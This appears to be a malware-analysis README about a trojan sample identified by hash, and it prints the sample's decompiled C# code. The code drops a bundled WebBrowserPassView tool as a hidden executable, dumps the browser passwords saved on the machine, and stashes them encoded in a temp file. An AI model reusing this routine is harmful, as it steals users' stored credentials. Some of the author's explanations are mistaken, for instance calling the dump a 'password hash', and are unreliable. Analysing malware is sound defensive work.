# 229a238ccba1c0ffa2491e794dcafd3b
So whats going on with this file? Lets go in depth and discuss what it is, what it claims to be, and the overall malware sample itself.
Malware sample 229a238ccba1c0ffa2491e794dcafd3b is a simple trojan. The file itself claims to be a (STUB)[https://security.stackexchange.com/questions/42289/what-is-a-stub].
When you run the program here is what it does.
```c
     private static T Create__Instance__<T>(T Instance) where T : Form, new()
            {

                if (Instance == null || Instance.IsDisposed)
                {
                    if (m_FormBeingCreated != null)
                    {
                        if (m_FormBeingCreated.ContainsKey(typeof(T)))
                        {
                            throw new InvalidOperationException(Utils.GetResourceString("WinForms_RecursiveFormCreate"));
                        }
                    }
                    else
                    {
                        m_FormBeingCreated = new Hashtable();
                    }
                    m_FormBeingCreated.Add(typeof(T), null);
                    try
                    {
                        return new T();
                        {
                            TargetInvocationException ex2;
                            string resourceString = Utils.GetResourceString("WinForms_SeeInnerException", ex2.InnerException.Message);
                            throw new InvalidOperationException(resourceString, ex2.InnerException);
                        }
                    }

                    finally
                    {
                        m_FormBeingCreated.Remove(typeof(T));
                    }
                }
                return Instance;
            }
``` 
Once ran the malware searches for the userhash of who ever is signed in.
```c
		public static void main()
		{
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2"))));
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Environment.Exit(0);
				ProjectData.ClearProjectError();
			}
			File.WriteAllBytes(Path.GetTempPath() + "\\Hassan.exe", Resources.WebBrowserPassView);
			Interaction.Shell(Path.GetTempPath() + "\\Hassan.exe /stext " + Interaction.Environ("tmp") + "\\PassByHassanAmiri.txt", AppWinStyle.Hide);
			string s = File.ReadAllText(Interaction.Environ("tmp") + "\\PassByHassanAmiri.txt");
			File.Delete(Interaction.Environ("tmp") + "\\PassByHassanAmiri.txt");
			string contents = Convert.ToBase64String(Encoding.ASCII.GetBytes(s)).Replace("p", "axx");
			File.WriteAllText(Path.GetTempPath() + "\\Passwords.bin", contents);
			Application.Exit();
		}
	}
}
```
Once found the malware dumps it to another file "Hassan.exe", which I assume is the sender part of this malware (I apologize for not having this sample. If you have it please do consider shooting me an email or if I find it I will update the repo). Regardless the malware sample saves your password hash as "PassByHassanAmiri.txt" (Subtle right ;).
## Summary
This is a simple trojan it aims to grab the users hash and send it back to the creater of the malware. Also something interesting to note the sample itself is it has a part called WebBrowserPassView and Cultureinfo, which I at first thought where telling it to dump the hashpass but there is no url, webhook or anything pretaining to this sample.